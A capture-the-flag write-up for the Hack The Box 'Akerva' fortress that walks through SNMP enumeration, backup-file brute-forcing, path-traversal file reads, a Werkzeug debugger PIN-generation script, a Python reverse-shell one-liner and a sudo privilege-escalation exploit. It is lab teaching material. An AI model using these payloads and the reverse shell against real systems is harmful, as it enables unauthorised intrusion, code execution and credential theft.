# HTB_Fortress : Akerva
### IP-10.13.37.11

Plain sight
----------------

Started nmap scan on the url and got 3 open ports:

```
22 - SSH
80 - HTTP
5000 - HTTP
```

Port 80 is a wordpress website where as 5000 have basic http authentication.
In the page source of port 80 website, I got first flag.

```
AKERVA{Ikn0w_F0rgoTTEN#CoMmeNts}
```

Take a look Around
------------------

I then scanned for UDP ports and got 161 port open which is running snmp.
I used metasploit to scan this port.

```
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS 10.13.37.11
run
```

In the output of running processes I got the second flag.

```
AKERVA{IkN0w_SnMP@@@MIsconfigur@T!onS}
```

Dead poets
-----------------

I downloaded the file which was creating backup zip every 17 minutes.

```
curl -X POST http://10.13.37.11/scripts/backup_every_17minutes.sh
```

This script is backing up the entire website into a zip file every 17 minutes and removing the previous backup files.
Now to get the latest backup file, I created a wordlist of all possible 4 digit numbers.

```
crunch 4 4 0123456789 -o wordlist.txt
```

After this used wfuzz to brute files in the backups directory.

First I got the timing of the machine by 

```
curl -I 10.13.37.11
```

I got something like:

```
....
Date: Fri, 01 Oct 2021 06:33:42
....
```

Now I know that the backp file must be named like: backup_2021100106XXXX.zip in the format YYYYMMDDHHMMSS

```
wfuzz -u http://10.13.37.11/backups/backup_2021100106FUZZ.zip -w wordlist.txt --hc 404
```

I got a hit at 2228.
I downloaded this backup file.

Got MySQL creds.

```
/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', 'ZokDHE_DJ_____enzU)=' );
```

Also in the dev folder, there is a file space_dev.py which contains the next flag

```
AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}
```

Open book
---------------------

From the script I found that this flag is also the password for the "aas" user in port 5000 website.

So i logged into the website as "aas".
From the script, I found that there is a /file directory which was taking arguments. So I thought this could be LFI attack.

Got the /etc/passwd by
```
http://10.13.37.11:5000/file?filename=../../../../../etc/passwd
```

So I can get the ssh keys of the "aas" user, but could not get it. 

Instead I got the next flag by:

```
http://10.13.37.11:5000/file?filename=../../../../../home/aas/flag.txt
AKERVA{IKNOW#LFi_@_}
```

Say Friend and Enter
--------------------

I found another directory /console which is an interactive console but pin protected.
Found that it was using Werkzeug Debugger.

And found this exploit (https://www.daehee.com/werkzeug-console-pin-exploit/) to gain console.
But for this I needed MAC address and machine ID.

So to get these I used the previous LFI attack to get these values.

To find server MAC address, need to know which network interface is being used to serve the app (e.g. ens3). If unknown, leak /proc/net/arp for device ID and then leak MAC address at /sys/class/net/<device id>/address.

And Machine ID is in /etc/machine-id.

Got the device ID :  ens33

```
# MAC address: 00:50:56:b9:06:ef 
# Machine ID : 258f132cd7e647caaf5510e3aca997c1 
```

Then convert MAC to decimal using python.

```
>> python3 -c 'print(0x5056b906ef)'                                          
345052350191
```

Got all the required values for the exploit.

Now the final exploit becomes:

```
import hashlib
from itertools import chain
probably_public_bits = [
        'aas',# username
        'flask.app',# modname
        'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
        '/usr/local/lib/python2.7/dist-packages/flask/app.pyc' # getattr(mod, '__file__', None),
]
 
private_bits = [
        '345052350191', # str(uuid.getnode()),  /sys/class/net/ens33/address
        '258f132cd7e647caaf5510e3aca997c1' # get_machine_id(), /etc/machine-id
]
 
h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
        if not bit:
                continue
        if isinstance(bit, str):
                bit = bit.encode('utf-8')
        h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')
 
cookie_name = '__wzd' + h.hexdigest()[:20]
 
num = None
if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]
 
rv =None
if rv is None:
        for group_size in 5, 4, 3:
                if len(num) % group_size == 0:
                        rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                                                  for x in range(0, len(num), group_size))
                        break
        else:
                rv = num
 
print(rv)
```

Running thie exploit I got the pin.

```
194-380-483
```
On entering this pin on the website, got an interactive python console.
So I used python reverse shell to get reverse shell.

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.16.45",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

In the directory of aas, there was a hidden file named .hiddenflag.txt

Got the next flag.

```
AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}
```

Super Mushroom
----------------------

I ran linpeas.sh and found the sudo version is 1.8.21p2 which is exploitable using this(https://github.com/saleemrashid/sudo-cve-2019-18634) exploit.
In my local machine I downloaded this exploit and made an executable output and transferred it into the machine. And on running I got root.

Next flag is in /root.

```
AKERVA{IkNow_Sud0_sUckS!}
```

Little Secret
----------------------

In secured_note.md there was a Base64 encoded string.

```
R09BSEdIRUVHU0FFRUhBQ0VHVUxSRVBFRUVDRU9LTUtFUkZTRVNGUkxLRVJVS1RTVlBNU1NOSFNLUkZGQUdJQVBWRVRDTk1ETFZGSERBT0dGTEFGR1NLRVVMTVZPT1dXQ0FIQ1JGVlZOVkhWQ01TWUVMU1BNSUhITU9EQVVLSEUK
```

Decoding it I got another encoded string.

```
GOAHGHEEGSAEEHACEGULREPEEECEOKMKERFSESFRLKERUKTSVPMSSNHSKRFFAGIAPVETCNMDLVFHDAOGFLAFGSKEULMVOOWWCAHCRFVVNVHVCMSYELSPMIHHMODAUKHE
```

Found that this was a vigerene code
Found that some alphabets are missing from the code: B J Q X Z
Removed them from the decode alphabet field in this(https://www.dcode.fr/vigenere-cipher) website.

The key is: ILOVESPACE
Decoded:

```
WELLDONEFORSOLVINGTHISCHALLENGEYOUCANSENDYOURRESUMEHEREATRECRUTEMENTAKERVACOMANDVALIDATETHELASTFLAGWITHAKERVAIKNOOOWVIGEEENERRRE
```

After adding spaces:

```
WELL DONE FOR SOLVING THIS CHALLENGE YOU CAN SEND YOUR RESUME HERE AT RECRUTEMENT AKERVA COMAND VALIDATE THE LAST FLAG WITH AKERVAIKNOOOWVIGEEENERRRE
```

Final flag is:

```
AKERVA{IKNOOOWVIGEEENERRRE}
```
